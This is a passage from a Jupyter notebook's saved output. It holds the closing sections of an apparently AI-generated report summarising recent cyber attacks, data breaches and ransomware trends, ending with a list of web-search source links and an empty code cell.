            "*   **Infographics**: Providing insights into threat actor TTPs and tactics.\n",
            "*   **Diagrams**: Illustrating the flow of data and systems affected by cyber attacks.\n",
            "*   **Screenshots**: Showcasing the impact of ransomware attacks on systems and data. [Google Serper](https://www.cm-alliance.com/cybersecurity-blog/may-2024-biggest-cyber-attacks-data-breaches-ransomware-attacks)\n",
            "\n",
            "**Addressing Gaps and Uncertainties**\n",
            "\n",
            "The report acknowledges several data limitations and uncertainties, including: [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "\n",
            "*   **Emerging threats**: New vulnerabilities and exploits are constantly emerging, making it challenging to stay ahead of threats.\n",
            "*   **Complexity of systems**: The increasing complexity of systems and networks makes it difficult to detect and respond to threats effectively.\n",
            "*   **Limited resources**: Organizations may not have the necessary resources to effectively respond to cyber attacks and data breaches. [Google Serper](https://www.cm-alliance.com/cybersecurity-blog/may-2024-biggest-cyber-attacks-data-breaches-ransomware-attacks)\n",
            "\n",
            "**Conclusion**\n",
            "\n",
            "The report provides a comprehensive analysis of the latest cyber threats, data breaches, and ransomware attacks. It emphasizes the importance of effective incident response, robust security measures, and ongoing monitoring and long-term planning. By implementing these recommendations, organizations can mitigate the risks associated with cyber attacks and data breaches, protecting their sensitive information and systems. [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "\n",
            "**Sources**\n",
            "- [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "- [Google Serper Image Search](https://www.reliaquest.com/wp-content/uploads/2023/12/Chart-with-logo-2024-Threat-Predictions-Blog-1.svg)\n",
            "- [Google Serper](https://purplesec.us/breach-report/)\n",
            "- [Google Serper](https://www.prevalent.net/blog/third-party-data-breaches/)\n",
            "- [Google Serper Image Search](https://socradar.io/wp-content/uploads/2024/08/Top-10-Threat-Actors-Mind-Map.png.webp)\n",
            "- [Google Serper](https://www.cm-alliance.com/cybersecurity-blog/may-2024-biggest-cyber-attacks-data-breaches-ransomware-attacks)\n",
            "- [Google Serper](https://www.csis.org/programs/strategic-technologies-program/significant-cyber-incidents)\n",
            "- [Google Serper Image Search](https://assets.esecurityplanet.com/uploads/2024/05/ESP_2023CybersecurityReports_24_KD_rnd1.png)\n",
            "- [Google Serper Image Search](https://cyberint.com/wp-content/uploads/2024/01/Untitled-design-2024-01-10T151216.652-1-1024x529.webp)\n",
            "- [Google Serper Image Search](https://socradar.io/wp-content/uploads/2024/07/ocd-threat-actors.png.webp)\n",
            "- [Google Programmable Search](https://socradar.io/hsbc-barclays-and-uk-gov-databases-compromised/)\n",
            "- [Google Serper](https://unit42.paloaltonetworks.com/)\n",
            "- [Google Serper Image Search](https://waterfall-security.com/wp-content/uploads/2024/03/newest-incident-chart-for-2024.png)\n",
            "- [Google Serper Image Search](https://www.itgovernanceusa.com/blog/wp-content/uploads/2024/06/image-10.png)\n",
            "- [Google Serper](https://cybersecurityventures.com/intrusion-daily-cyber-threat-alert/)\n",
            "- [Google Serper](https://cloud.google.com/security/mandiant)\n",
            "- [Google Serper Image Search](https://www.itgovernanceusa.com/blog/wp-content/uploads/2024/05/image-13.png)\n",
            "- [Google Serper Image Search](https://assets.weforum.org/editor/ojr0Cc1taevkO8zRgW2EdfBNPqYqviT1_RMGRgB-JW8.png)\n",
            "- [Google Serper](https://www.cisa.gov/news-events/cybersecurity-advisories)\n",
            "- [Google Serper Image Search](https://www.itgovernance.co.uk/blog/wp-content/uploads/2024/02/image-4-724x1024.png)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "6-Uzh42RMwul"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}